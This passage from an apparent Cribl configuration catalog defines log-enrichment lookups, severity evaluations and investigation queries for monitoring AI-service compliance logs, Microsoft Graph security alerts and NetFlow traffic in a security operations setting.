          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: user_risk_profiles.csv\n// Input: user_id → id (exact match)\n// Output: user_risk_score, previous_violations, department\n//\n// BEFORE: { user_id: "user_004", policy_violated: "pii_exposure" }\n// AFTER:  { user_id: "user_004", user_risk_score: 90, previous_violations: 7, department: "Sales" }',
          notes: 'Risk scores recalculated weekly based on violation history, role sensitivity, and data access level. Scores >80 trigger automatic DLP scanning on all AI interactions. Update after each confirmed violation.'
        }
      },
      {
        name: 'Data Classification Eval',
        description: 'Classify the sensitivity level of flagged content based on context signals and determine retention and DLP requirements.',
        criblFunction: 'Eval',
        addedFields: ['sensitivity_level', 'requires_dlp', 'retention_category'],
        securityValue: 'Ensures high-sensitivity data interactions are flagged for DLP review in real-time, prevents sensitive data from being logged in lower-tier storage without proper controls.',
        observabilityValue: 'Tracks data sensitivity distribution across AI workloads, identifies applications processing more sensitive data than expected, supports data governance reporting.',
        personas: ['SOC', 'Compliance', 'Security Engineering'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            evaluations: [
              'sensitivity_level = pii_detected === \'true\' || has_financial_data === \'true\' ? \'high\' : has_internal_data === \'true\' ? \'medium\' : \'low\'',
              'requires_dlp = sensitivity_level === \'high\' ? \'true\' : \'false\'',
              'retention_category = sensitivity_level === \'high\' ? \'7year\' : sensitivity_level === \'medium\' ? \'3year\' : \'1year\''
            ]
          },
          example: '// Cribl Stream → Processing → Eval Function\n// BEFORE: { pii_detected: "true", has_financial_data: "false", has_internal_data: "true" }\n// AFTER:  { ..., sensitivity_level: "high", requires_dlp: "true", retention_category: "7year" }',
          notes: 'Sensitivity classification drives routing decisions — high sensitivity events go to compliance-tier storage with encryption at rest. Adjust thresholds based on regulatory requirements (GDPR, CCPA, HIPAA).'
        }
      },
      {
        name: 'Policy Severity Mapping Lookup',
        description: 'Map violated policy names to severity levels, escalation requirements, and auto-block decisions from a compliance-maintained policy registry.',
        criblFunction: 'Lookup',
        addedFields: ['policy_priority', 'escalation_required', 'auto_block'],
        securityValue: 'Ensures consistent response to policy violations regardless of analyst on duty — critical policies always escalate, reducing human judgment variability.',
        observabilityValue: 'Tracks policy violation distribution by severity, identifies most-triggered policies for tuning, measures auto-block effectiveness and false positive rates.',
        personas: ['SOC', 'Compliance', 'Security Engineering'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'policy_severity_map.csv',
            inputField: 'policy_name → policy',
            outputFields: ['policy_priority', 'escalation_required', 'auto_block'],
            reloadInterval: '30 minutes'
          },
          lookupSample: 'policy,policy_priority,escalation_required,auto_block\npii_exposure,P1,true,true\ncode_exfiltration,P1,true,true\nhateful_content,P2,true,false\noff_topic_usage,P3,false,false',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: policy_severity_map.csv\n// Input: policy_name → policy (exact match)\n// Output: policy_priority, escalation_required, auto_block\n//\n// BEFORE: { policy_name: "pii_exposure", user_id: "user_003" }\n// AFTER:  { policy_name: "pii_exposure", policy_priority: "P1", escalation_required: "true", auto_block: "true" }',
          notes: 'Policy registry owned by compliance team. Changes require approval workflow. Auto-block policies must have <1% false positive rate validated over 30 days before enabling. Review quarterly with legal.'
        }
      },
      {
        name: 'PII Type Severity Eval',
        description: 'Score detected PII types by regulatory risk to prioritize response — SSNs and financial data score higher than email addresses or names.',
        criblFunction: 'Eval',
        addedFields: ['pii_risk_score', 'highest_pii_category', 'regulatory_impact'],
        securityValue: 'Differentiates between low-risk PII exposure (name in prompt) and high-risk exposure (SSN, credit card) to focus incident response resources on genuine data breaches.',
        observabilityValue: 'Tracks PII exposure distribution by type and severity, identifies applications with systemic PII handling issues, supports regulatory reporting with precise categorization.',
        personas: ['SOC', 'Compliance', 'Security Engineering'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            evaluations: [
              'pii_risk_score = (has_ssn === \'true\' ? 40 : 0) + (has_credit_card === \'true\' ? 35 : 0) + (has_health_data === \'true\' ? 30 : 0) + (has_email === \'true\' ? 10 : 0) + (has_name === \'true\' ? 5 : 0)',
              'highest_pii_category = has_ssn === \'true\' ? \'SSN\' : has_credit_card === \'true\' ? \'financial\' : has_health_data === \'true\' ? \'PHI\' : has_email === \'true\' ? \'contact\' : \'general\'',
              'regulatory_impact = pii_risk_score >= 40 ? \'breach_notification\' : pii_risk_score >= 30 ? \'regulatory_review\' : \'internal_only\''
            ]
          },
          example: '// Cribl Stream → Processing → Eval Function\n// BEFORE: { has_ssn: "true", has_credit_card: "false", has_health_data: "false", has_email: "true", has_name: "true" }\n// AFTER:  { ..., pii_risk_score: 55, highest_pii_category: "SSN", regulatory_impact: "breach_notification" }',
          notes: 'Score thresholds aligned with breach notification requirements: >=40 triggers mandatory notification workflow (72h GDPR, state-specific US laws). Adjust weights based on jurisdiction and industry regulations.'
        }
      },
      {
        name: 'Application Context Lookup',
        description: 'Enrich source_application identifier with operational context including tier, owner, and data handling requirements from an application registry.',
        criblFunction: 'Lookup',
        addedFields: ['app_tier', 'app_owner', 'data_handling_requirements'],
        securityValue: 'Identifies violations from Tier-1 production applications (higher severity) vs development tools (lower severity), enables owner-routed notifications for faster response.',
        observabilityValue: 'Enables compliance tracking by application tier, supports audit reporting with clear ownership chains, identifies applications needing data handling policy updates.',
        personas: ['SOC', 'Compliance', 'Platform Engineering'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'application_registry.csv',
            inputField: 'source_application → app_id',
            outputFields: ['app_tier', 'app_owner', 'data_handling_requirements'],
            reloadInterval: '2 hours'
          },
          lookupSample: 'app_id,app_tier,app_owner,data_handling_requirements\nchat-prod,tier-1,customer-experience,pii-encrypted-audit-full\ninternal-copilot,tier-2,platform-eng,internal-only-audit-standard\nresearch-tool,tier-3,data-science,no-customer-data\nqa-bot,tier-3,qa-team,synthetic-data-only',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: application_registry.csv\n// Input: source_application → app_id (exact match)\n// Output: app_tier, app_owner, data_handling_requirements\n//\n// BEFORE: { source_application: "chat-prod", policy_violated: "pii_exposure" }\n// AFTER:  { source_application: "chat-prod", app_tier: "tier-1", app_owner: "customer-experience", data_handling_requirements: "pii-encrypted-audit-full" }',
          notes: 'Application registry synced from service catalog. Tier-1 apps have stricter SLAs for violation response (15min acknowledge). Data handling requirements field drives automated routing to appropriate DLP pipelines.'
        }
      }
    ],
    searchTime: [
      {
        name: 'Violation History',
        description: 'At investigation time, retrieve a user\'s recent violation history to assess whether current incident is isolated or part of a pattern.',
        criblFunction: 'Search-time lookup',
        addedFields: ['violations_30d', 'repeat_offender'],
        securityValue: 'Repeat offenders (3+ violations in 30 days) indicate either malicious intent or fundamental misunderstanding of policies — both require different escalation paths than first-time violations.',
        observabilityValue: 'Tracks recidivism trends, measures training program effectiveness (should reduce repeat violations), identifies users needing intervention before termination thresholds.',
        personas: ['SOC', 'Compliance', 'Security Engineering'],
        implementation: {
          example: '// Cribl Search violation history:\n// dataset="openai_compliance" earliest=-30d\n// | where user_id == "$SUSPECT_USER" and policy_violated != ""\n// | summarize violations_30d=count(), unique_policies=dcount(policy_violated), latest_violation=max(timestamp) by user_id\n// | extend repeat_offender = iif(violations_30d >= 3, "true", "false")\n// | extend escalation_recommendation = iif(violations_30d >= 5, "manager_notification", iif(violations_30d >= 3, "security_review", "standard_process"))',
          notes: 'Repeat offender threshold (3 violations/30d) aligned with HR progressive discipline policy. First offense = warning, third = manager notification, fifth = access suspension pending review. Exclude auto-resolved false positives from counts.'
        }
      },
      {
        name: 'Compliance Posture',
        description: 'At investigation time, retrieve an application or team\'s overall compliance posture score and open issue count for contextual prioritization.',
        criblFunction: 'Search-time lookup',
        addedFields: ['compliance_score', 'open_issues_count'],
        securityValue: 'Applications with low compliance scores (many open issues) represent higher risk — new violations in these contexts deserve faster escalation as they indicate systemic control failures.',
        observabilityValue: 'Provides compliance health trending per application, supports executive reporting on AI governance maturity, identifies teams falling below acceptable compliance thresholds.',
        personas: ['Compliance', 'Security Engineering', 'SRE'],
        implementation: {
          example: '// Cribl Search compliance posture:\n// dataset="openai_compliance" earliest=-90d\n// | where source_application == "$TARGET_APP"\n// | summarize total_violations=count(), resolved=countif(status=="resolved"), open_issues_count=countif(status=="open") by source_application\n// | extend compliance_score = round((1 - (open_issues_count / total_violations)) * 100, 1)\n// | extend posture_rating = iif(compliance_score >= 95, "excellent", iif(compliance_score >= 85, "good", iif(compliance_score >= 70, "needs_improvement", "critical")))',
          notes: 'Compliance score = percentage of violations resolved. Score <70% triggers mandatory remediation plan. Report monthly to CISO. Exclude violations <7 days old from score (allow resolution time).'
        }
      }
    ]
  },
  'anthropic-compliance': {
    streamTime: [
      {
        name: 'Workspace Classification Lookup',
        description: 'Enrich workspace_id with organizational context including workspace name, owner, data sensitivity level, and cost center from workspace registry.',
        criblFunction: 'Lookup',
        addedFields: ['workspace_name', 'workspace_owner', 'data_sensitivity', 'cost_center'],
        securityValue: 'Identifies compliance events from high-sensitivity workspaces that require immediate escalation, detects activity in workspaces that should be decommissioned or restricted.',
        observabilityValue: 'Enables workspace-level cost attribution, tracks usage patterns by sensitivity tier, supports chargeback and budget forecasting by cost center.',
        personas: ['SOC', 'Compliance', 'FinOps', 'Platform Engineering'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'anthropic_workspaces.csv',
            inputField: 'workspace_id → id',
            outputFields: ['workspace_name', 'workspace_owner', 'data_sensitivity', 'cost_center'],
            reloadInterval: '1 hour'
          },
          lookupSample: 'id,workspace_name,workspace_owner,data_sensitivity,cost_center\nws_prod_001,customer-support-ai,cx-team,high,CC-5100\nws_prod_002,internal-knowledge,platform-eng,medium,CC-5200\nws_dev_003,model-evaluation,ml-research,low,CC-5300\nws_prod_004,legal-review-ai,legal-ops,critical,CC-5400',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: anthropic_workspaces.csv\n// Input: workspace_id → id (exact match)\n// Output: workspace_name, workspace_owner, data_sensitivity, cost_center\n//\n// BEFORE: { workspace_id: "ws_prod_004", event_type: "safety_trigger" }\n// AFTER:  { workspace_id: "ws_prod_004", workspace_name: "legal-review-ai", workspace_owner: "legal-ops", data_sensitivity: "critical", cost_center: "CC-5400" }',
          notes: 'Workspaces with data_sensitivity="critical" route all events to compliance-tier storage with full audit trail. Sync workspace registry from Anthropic admin API daily. Unknown workspace IDs flagged as governance gaps.'
        }
      },
      {
        name: 'Model Cost Eval',
        description: 'Calculate estimated cost per request and classify against budget thresholds to enable real-time spend alerting.',
        criblFunction: 'Eval',
        addedFields: ['cost_tier', 'is_over_budget', 'daily_spend_pct'],
        securityValue: 'Sudden cost spikes indicate potential API key compromise or abuse — attackers often generate massive token volumes for data extraction or resale.',
        observabilityValue: 'Real-time cost visibility per request, enables budget burn-rate alerting before monthly limits are hit, supports capacity planning with per-model cost breakdowns.',
        personas: ['SRE', 'FinOps', 'Platform Engineering'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            evaluations: [
              'cost_tier = /^claude-(opus|3-5-sonnet)/.test(model) ? \'premium\' : /^claude-(sonnet|3-haiku)/.test(model) ? \'standard\' : \'economy\'',
              'is_over_budget = daily_cost_accumulated > daily_budget_limit ? \'true\' : \'false\'',
              'daily_spend_pct = Math.round((daily_cost_accumulated / daily_budget_limit) * 100)'
            ]
          },
          example: '// Cribl Stream → Processing → Eval Function\n// BEFORE: { model: "claude-opus-4", input_tokens: 10000, output_tokens: 5000, daily_cost_accumulated: 850, daily_budget_limit: 1000 }\n// AFTER:  { ..., cost_tier: "premium", is_over_budget: "false", daily_spend_pct: 85 }',
          notes: 'Budget limits configured per workspace. Alert at 80% daily spend (warning) and 100% (critical). Premium tier models (Opus) consume budget 10-15x faster than economy (Haiku). Adjust daily_budget_limit per cost center.'
        }
      },
      {
        name: 'Safety Category Severity Eval',
        description: 'Classify safety trigger events by severity based on category and context to determine escalation and review requirements.',
        criblFunction: 'Eval',
        addedFields: ['safety_severity', 'requires_review', 'auto_escalate'],
        securityValue: 'High-severity safety triggers (CSAM, weapons, self-harm instructions) require immediate escalation to trust & safety team — automated classification ensures no delays in critical response.',
        observabilityValue: 'Tracks safety trigger distribution by severity, measures content policy effectiveness, identifies applications with disproportionate high-severity triggers for architectural review.',
        personas: ['SOC', 'Compliance', 'Security Engineering'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            evaluations: [
              'safety_severity = [\'csam\', \'weapons_creation\', \'self_harm_instructions\'].includes(safety_category) ? \'critical\' : [\'violence_graphic\', \'hate_speech\', \'harassment\'].includes(safety_category) ? \'high\' : [\'mild_violence\', \'profanity\', \'adult_content\'].includes(safety_category) ? \'medium\' : \'low\'',
              'requires_review = safety_severity === \'critical\' || safety_severity === \'high\' ? \'true\' : \'false\'',
              'auto_escalate = safety_severity === \'critical\' ? \'true\' : \'false\''
            ]
          },
          example: '// Cribl Stream → Processing → Eval Function\n// BEFORE: { safety_category: "weapons_creation", user_id: "user_005", workspace_id: "ws_prod_001" }\n// AFTER:  { ..., safety_severity: "critical", requires_review: "true", auto_escalate: "true" }',
          notes: 'Critical severity triggers page trust & safety on-call immediately (PagerDuty integration). High severity queues for next-business-day review. Maintain category lists in sync with Anthropic\'s usage policy updates.'
        }
      },
      {
        name: 'User Department Lookup',
        description: 'Enrich user_id with organizational context including department, manager, usage tier, and approved model list from IAM directory.',
        criblFunction: 'Lookup',
        addedFields: ['department', 'manager', 'usage_tier', 'approved_models'],
        securityValue: 'Enables detection of users accessing models outside their approved list, correlates safety triggers with department for targeted policy enforcement.',
        observabilityValue: 'Supports department-level compliance reporting, identifies teams with higher safety trigger rates for focused training, enables manager notification workflows.',
        personas: ['SOC', 'Compliance', 'Security Engineering'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'user_directory_anthropic.csv',
            inputField: 'user_id → id',
            outputFields: ['department', 'manager', 'usage_tier', 'approved_models'],
            reloadInterval: '4 hours'
          },
          lookupSample: 'id,department,manager,usage_tier,approved_models\nuser_101,Engineering,sarah.chen,unlimited,opus|sonnet|haiku\nuser_102,Marketing,mike.ross,standard,sonnet|haiku\nuser_103,Legal,amy.law,restricted,haiku\nuser_104,Research,phil.data,unlimited,opus|sonnet|haiku',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: user_directory_anthropic.csv\n// Input: user_id → id (exact match)\n// Output: department, manager, usage_tier, approved_models\n//\n// BEFORE: { user_id: "user_102", model: "claude-opus-4", safety_category: "none" }\n// AFTER:  { user_id: "user_102", department: "Marketing", manager: "mike.ross", usage_tier: "standard", approved_models: "sonnet|haiku" }',
          notes: 'approved_models field is pipe-delimited for Eval comparison. Alert when model used is not in approved_models list. Sync from HR/IAM system daily. Usage tier determines rate limits and model access permissions.'
        }
      },
      {
        name: 'GeoIP Enrichment',
        description: 'Add geographic context to API request source IPs for compliance monitoring and anomalous access detection.',
        criblFunction: 'GeoIP',
        addedFields: ['geo_country', 'geo_city', 'geo_asn'],
        securityValue: 'Identifies API access from restricted jurisdictions, detects credential sharing across geographies, supports data residency compliance for regulated workspaces.',
        observabilityValue: 'Maps API usage geographically, identifies regional latency patterns, supports capacity planning for geo-distributed deployments.',
        personas: ['SOC', 'Compliance', 'Security Engineering'],
        implementation: {
          functionConfig: {
            function: 'GeoIP',
            inputField: 'ip_address',
            geoipDatabase: 'MaxMind GeoLite2-City + GeoLite2-ASN',
            outputPrefix: 'geo_'
          },
          example: '// Cribl Stream → Processing → GeoIP Function\n// Input Field: ip_address\n// Output Fields: geo_country, geo_city, geo_asn\n//\n// BEFORE: { ip_address: "185.220.101.42", user_id: "user_103", workspace_id: "ws_prod_004" }\n// AFTER:  { ip_address: "185.220.101.42", geo_country: "RU", geo_city: "Moscow", geo_asn: "AS57523", user_id: "user_103" }',
          notes: 'Critical workspaces (data_sensitivity="critical") should only be accessed from approved countries. Maintain country allowlist per workspace. Tor exit node ASNs should always trigger alerts regardless of workspace sensitivity.'
        }
      }
    ],
    searchTime: [
      {
        name: 'Usage Pattern Baseline',
        description: 'At investigation time, retrieve a user\'s historical request volume and token consumption baseline to identify anomalous activity patterns.',
        criblFunction: 'Search-time lookup',
        addedFields: ['avg_daily_requests', 'token_anomaly_score'],
        securityValue: 'Request volume anomalies (5x+ baseline) combined with safety triggers indicate potential adversarial prompt testing or automated abuse of API access.',
        observabilityValue: 'Enables per-user capacity planning, identifies users approaching rate limits, supports proactive quota adjustment before disruption.',
        personas: ['SOC', 'SRE', 'Security Engineering'],
        implementation: {
          example: '// Cribl Search usage pattern baseline:\n// dataset="anthropic_compliance" earliest=-30d latest=-1d\n// | where user_id == "$SUSPECT_USER"\n// | summarize avg_daily_requests=avg(daily_request_count), stddev_requests=stdev(daily_request_count), avg_tokens=avg(total_tokens) by user_id\n// | extend token_anomaly_score = round(($TODAY_TOKENS - avg_tokens) / stddev_requests, 2)\n// | extend pattern_assessment = iif(token_anomaly_score > 3, "highly_anomalous", iif(token_anomaly_score > 2, "anomalous", "within_normal"))',
          notes: 'Baseline requires minimum 14 days of history for statistical validity. New users flagged as "insufficient_baseline" until threshold met. Weekend/holiday patterns may differ — consider day-of-week normalization for accuracy.'
        }
      },
      {
        name: 'Safety Trigger History',
        description: 'At investigation time, retrieve a user\'s safety trigger history to assess whether current trigger is isolated or part of an escalating pattern.',
        criblFunction: 'Search-time lookup',
        addedFields: ['safety_triggers_30d', 'trigger_trend'],
        securityValue: 'Escalating safety trigger frequency indicates deliberate probing of content policy boundaries — a strong indicator of adversarial intent requiring account suspension review.',
        observabilityValue: 'Tracks per-user safety posture over time, measures content policy training effectiveness, identifies users trending toward policy thresholds.',
        personas: ['SOC', 'Compliance', 'Security Engineering'],
        implementation: {
          example: '// Cribl Search safety trigger history:\n// dataset="anthropic_compliance" earliest=-30d\n// | where user_id == "$SUSPECT_USER" and safety_category != "none"\n// | summarize safety_triggers_30d=count(), unique_categories=dcount(safety_category), recent_7d=countif(timestamp > ago(7d)), prior_23d=countif(timestamp <= ago(7d)) by user_id\n// | extend trigger_trend = iif(recent_7d > prior_23d * (7/23), "increasing", iif(recent_7d < prior_23d * (7/23) * 0.5, "decreasing", "stable"))\n// | extend risk_assessment = iif(safety_triggers_30d >= 10 and trigger_trend == "increasing", "escalate_immediately", iif(safety_triggers_30d >= 5, "enhanced_monitoring", "standard_monitoring"))',
          notes: 'Increasing trend with 10+ triggers in 30 days = automatic escalation to security team. Decreasing trend after training intervention = positive signal. Track category diversity — triggers across many categories suggest systematic policy testing.'
        }
      }
    ]
  },
  'microsoft-graph': {
    streamTime: [
      {
        name: 'GeoIP Enrichment',
        description: 'Add geographic context including country, city, ASN, and organization to IP addresses in Microsoft Graph security events.',
        criblFunction: 'GeoIP',
        addedFields: ['geo_country', 'geo_city', 'geo_asn', 'geo_org'],
        securityValue: 'Enables impossible travel detection across M365 services, identifies sign-ins from sanctioned nations, enriches security alerts with geographic context for faster analyst triage.',
        observabilityValue: 'Maps M365 usage by geography, identifies regional service adoption patterns, supports capacity planning for geo-distributed organizations.',
        personas: ['SOC', 'Security Engineering', 'Compliance', 'SRE'],
        implementation: {
          functionConfig: {
            function: 'GeoIP',
            inputField: 'ip_address',
            geoipDatabase: 'MaxMind GeoLite2-City + GeoLite2-ASN',
            outputPrefix: 'geo_'
          },
          example: '// Cribl Stream → Processing → GeoIP Function\n// Input Field: ip_address\n// Output Fields: geo_country, geo_city, geo_asn, geo_org\n//\n// BEFORE: { ip_address: "104.47.58.12", user_principal_name: "jsmith@contoso.com", event_type: "sign_in" }\n// AFTER:  { ip_address: "104.47.58.12", geo_country: "US", geo_city: "Chicago", geo_asn: "AS8075", geo_org: "Microsoft Corporation" }',
          notes: 'Microsoft services often show Microsoft-owned ASNs — exclude these from anomaly detection. Focus geographic analysis on client IPs, not service-side IPs. Combine with Azure AD named locations for corporate network identification.'
        }
      },
      {
        name: 'User Risk Context Lookup',
        description: 'Enrich user_principal_name with risk context including department, VIP status, incident history, and account age for alert prioritization.',
        criblFunction: 'Lookup',
        addedFields: ['user_department', 'user_vip', 'previous_incidents', 'account_age_days'],
        securityValue: 'VIP users (executives, admins) receiving alerts get immediate escalation. New accounts (<30 days) with security events are high-confidence compromise indicators. Previous incidents raise baseline suspicion.',
        observabilityValue: 'Enables risk-weighted alert dashboards, tracks incident rates by department, identifies onboarding-period vulnerability windows for new accounts.',
        personas: ['SOC', 'Security Engineering', 'Incident Response'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'graph_user_risk_context.csv',
            inputField: 'user_principal_name → upn',
            outputFields: ['user_department', 'user_vip', 'previous_incidents', 'account_age_days'],
            reloadInterval: '2 hours'
          },
          lookupSample: 'upn,user_department,user_vip,previous_incidents,account_age_days\njsmith@contoso.com,Engineering,false,0,1250\nceo@contoso.com,Executive,true,1,2800\nnewuser@contoso.com,Sales,false,0,15\nadmin@contoso.com,IT,true,3,900',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: graph_user_risk_context.csv\n// Input: user_principal_name → upn (exact match)\n// Output: user_department, user_vip, previous_incidents, account_age_days\n//\n// BEFORE: { user_principal_name: "ceo@contoso.com", alert_type: "impossible_travel" }\n// AFTER:  { user_principal_name: "ceo@contoso.com", user_department: "Executive", user_vip: "true", previous_incidents: 1, account_age_days: 2800 }',
          notes: 'Sync from Azure AD/Entra ID via Graph API daily. VIP list maintained by security team — includes C-suite, IT admins, and users with access to sensitive data. Account age calculated from createdDateTime in Azure AD.'
        }
      },
      {
        name: 'Alert Severity Normalization Eval',
        description: 'Normalize alert severity from multiple Microsoft Graph security providers into a consistent priority scoring system with SLA-driven response times.',
        criblFunction: 'Eval',
        addedFields: ['normalized_severity', 'priority_score', 'sla_hours'],
        securityValue: 'Microsoft Graph aggregates alerts from Defender, MCAS, Azure AD Identity Protection — each with different severity scales. Normalization ensures consistent triage regardless of source.',
        observabilityValue: 'Enables unified severity dashboards across all Microsoft security products, supports consistent SLA tracking, measures cross-product alert volume by normalized severity.',
        personas: ['SOC', 'Security Engineering', 'Incident Response'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            evaluations: [
              'normalized_severity = severity === \'high\' || severity === \'critical\' ? \'critical\' : severity === \'medium\' ? \'high\' : severity === \'low\' ? \'medium\' : \'low\'',
              'priority_score = (normalized_severity === \'critical\' ? 10 : normalized_severity === \'high\' ? 7 : normalized_severity === \'medium\' ? 4 : 1) * (user_vip === \'true\' ? 2 : 1)',
              'sla_hours = priority_score >= 14 ? 1 : priority_score >= 7 ? 4 : priority_score >= 4 ? 24 : 72'
            ]
          },
          example: '// Cribl Stream → Processing → Eval Function\n// BEFORE: { severity: "high", user_vip: "true", service_source: "Microsoft Defender for Endpoint" }\n// AFTER:  { ..., normalized_severity: "critical", priority_score: 20, sla_hours: 1 }',
          notes: 'VIP multiplier (2x) ensures executive account compromises always get fastest SLA. Priority score >14 pages on-call. Adjust SLA hours per organizational incident response SLAs. Review normalization mappings when Microsoft updates severity definitions.'
        }
      },
      {
        name: 'Service Source Classification Lookup',
        description: 'Map Microsoft Graph security service_source to friendly product names, detection quality ratings, and recommended response playbooks.',
        criblFunction: 'Lookup',
        addedFields: ['product_name', 'detection_quality', 'response_playbook'],
        securityValue: 'Different Microsoft security products have varying detection fidelity — Defender for Endpoint has higher true positive rates than generic Azure AD anomaly detection. Classification enables confidence-weighted triage.',
        observabilityValue: 'Tracks alert volume and quality by product, identifies noisy sources needing tuning, measures detection coverage gaps across the Microsoft security portfolio.',
        personas: ['SOC', 'Security Engineering', 'Incident Response'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'graph_service_sources.csv',
            inputField: 'service_source → source_id',
            outputFields: ['product_name', 'detection_quality', 'response_playbook'],
            reloadInterval: '24 hours'
          },
          lookupSample: 'source_id,product_name,detection_quality,response_playbook\nMicrosoft Defender for Endpoint,MDE,high,endpoint-isolation-playbook\nMicrosoft Cloud App Security,MCAS,medium,cloud-app-investigation\nAzure Active Directory Identity Protection,AAD-IP,medium,identity-compromise-playbook\nMicrosoft Defender for Office 365,MDO,high,email-threat-playbook',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: graph_service_sources.csv\n// Input: service_source → source_id (exact match)\n// Output: product_name, detection_quality, response_playbook\n//\n// BEFORE: { service_source: "Microsoft Defender for Endpoint", alert_title: "Suspicious process execution" }\n// AFTER:  { service_source: "Microsoft Defender for Endpoint", product_name: "MDE", detection_quality: "high", response_playbook: "endpoint-isolation-playbook" }',
          notes: 'Detection quality ratings based on historical true positive rates: high (>80% TP), medium (50-80% TP), low (<50% TP). Review quarterly. Playbook field maps to SOAR automation runbook IDs for one-click response.'
        }
      },
      {
        name: 'Conditional Access Gap Eval',
        description: 'Identify conditional access policy gaps by evaluating sign-in context against expected policy enforcement to detect missing or bypassed controls.',
        criblFunction: 'Eval',
        addedFields: ['ca_gap_detected', 'missing_policy', 'risk_exposure'],
        securityValue: 'Detects sign-ins that should have been blocked or challenged by conditional access but weren\'t — indicating policy misconfiguration, exclusion abuse, or enforcement gaps.',
        observabilityValue: 'Measures conditional access coverage effectiveness, identifies authentication flows bypassing intended controls, supports zero-trust posture assessment.',
        personas: ['SOC', 'Security Engineering', 'Compliance'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            evaluations: [
              'ca_gap_detected = (risk_level === \'high\' && mfa_enforced !== \'true\') || (app_category === \'sensitive\' && device_compliant !== \'true\') || (geo_country !== \'US\' && ca_policies_applied === 0) ? \'true\' : \'false\'',
              'missing_policy = risk_level === \'high\' && mfa_enforced !== \'true\' ? \'mfa_for_risky_signin\' : app_category === \'sensitive\' && device_compliant !== \'true\' ? \'compliant_device_required\' : geo_country !== \'US\' && ca_policies_applied === 0 ? \'geo_restriction\' : \'none\'',
              'risk_exposure = ca_gap_detected === \'true\' && user_vip === \'true\' ? \'critical\' : ca_gap_detected === \'true\' ? \'high\' : \'none\''
            ]
          },
          example: '// Cribl Stream → Processing → Eval Function\n// BEFORE: { risk_level: "high", mfa_enforced: "false", geo_country: "US", user_vip: "true", ca_policies_applied: 1 }\n// AFTER:  { ..., ca_gap_detected: "true", missing_policy: "mfa_for_risky_signin", risk_exposure: "critical" }',
          notes: 'Conditional access gaps are critical findings — each represents a control failure. Feed ca_gap_detected="true" events to a dedicated CA review queue. Track gap closure rate weekly. Common gaps: legacy auth protocols bypassing MFA, excluded groups growing too large.'
        }
      }
    ],
    searchTime: [
      {
        name: 'User Risk Timeline',
        description: 'At investigation time, retrieve a user\'s risk event history over 30 days to assess risk trajectory and determine if current alert is part of an escalating pattern.',
        criblFunction: 'Search-time lookup',
        addedFields: ['risk_events_30d', 'risk_trend_direction'],
        securityValue: 'Users with increasing risk event frequency are likely under active attack or engaging in increasingly risky behavior — both warrant proactive intervention before a breach occurs.',
        observabilityValue: 'Enables risk trend visualization per user, supports proactive outreach to users with deteriorating risk posture, measures security awareness training impact.',
        personas: ['SOC', 'Threat Hunting', 'Security Engineering'],
        implementation: {
          example: '// Cribl Search user risk timeline:\n// dataset="microsoft_graph" earliest=-30d\n// | where user_principal_name == "$SUSPECT_USER" and normalized_severity in ("critical", "high")\n// | summarize risk_events_30d=count(), recent_7d=countif(timestamp > ago(7d)), prior_23d=countif(timestamp <= ago(7d)) by user_principal_name\n// | extend risk_trend_direction = iif(recent_7d > prior_23d * (7/23) * 1.5, "increasing", iif(recent_7d < prior_23d * (7/23) * 0.5, "decreasing", "stable"))\n// | extend risk_assessment = iif(risk_events_30d >= 10 and risk_trend_direction == "increasing", "active_threat", iif(risk_events_30d >= 5, "elevated_risk", "normal"))',
          notes: 'Increasing trend with 10+ events strongly suggests active compromise — escalate to incident response immediately. Decreasing trends after remediation actions confirm effectiveness. Exclude known-benign events (e.g., VPN reconnections) from counts.'
        }
      },
      {
        name: 'Alert Correlation',
        description: 'At investigation time, find related alerts within 24 hours of the current alert to identify multi-stage attacks and determine if alert belongs to an existing incident.',
        criblFunction: 'Search-time lookup',
        addedFields: ['related_alerts_24h', 'incident_membership'],
        securityValue: 'Multi-stage attacks (phishing → credential theft → lateral movement) generate alerts across different products. Correlation reveals the kill chain that individual alerts miss.',
        observabilityValue: 'Reduces alert fatigue by grouping related alerts into incidents, measures mean-time-to-correlate, identifies detection coverage gaps in attack chain visibility.',
        personas: ['SOC', 'Incident Response', 'Threat Hunting'],
        implementation: {
          example: '// Cribl Search alert correlation:\n// dataset="microsoft_graph" earliest=-24h\n// | where user_principal_name == "$ALERT_USER" or ip_address == "$ALERT_IP" or device_id == "$ALERT_DEVICE"\n// | where alert_id != "$CURRENT_ALERT_ID"\n// | summarize related_alerts_24h=count(), related_products=makeset(product_name), related_severities=makeset(normalized_severity) by user_principal_name\n// | extend incident_membership = iif(related_alerts_24h >= 3, "likely_incident", iif(related_alerts_24h >= 1, "possible_incident", "isolated_alert"))\n// | extend kill_chain_stage = iif(related_products has "AAD-IP" and related_products has "MDE", "credential_to_endpoint", iif(related_products has "MDO" and related_products has "AAD-IP", "phishing_to_credential", "single_stage"))',
          notes: 'Correlation across 3+ products within 24h is high-confidence multi-stage attack. Auto-create incident in SOAR when incident_membership="likely_incident". Use entity overlap (user, IP, device) for correlation — not just time proximity.'
        }
      }
    ]
  },
  'netflow': {
    streamTime: [
      {
        name: 'GeoIP Enrichment',
        description: 'Add geographic context to both source and destination addresses in NetFlow records for traffic origin/destination intelligence.',
        criblFunction: 'GeoIP',
        addedFields: ['src_country', 'src_asn', 'dst_country', 'dst_asn'],
        securityValue: 'Identifies data exfiltration to high-risk countries, detects C2 communication with known-bad ASNs, enables geographic traffic policy enforcement at the flow level.',
        observabilityValue: 'Maps traffic flows geographically for capacity planning, identifies international transit patterns, supports peering optimization and CDN placement decisions.',
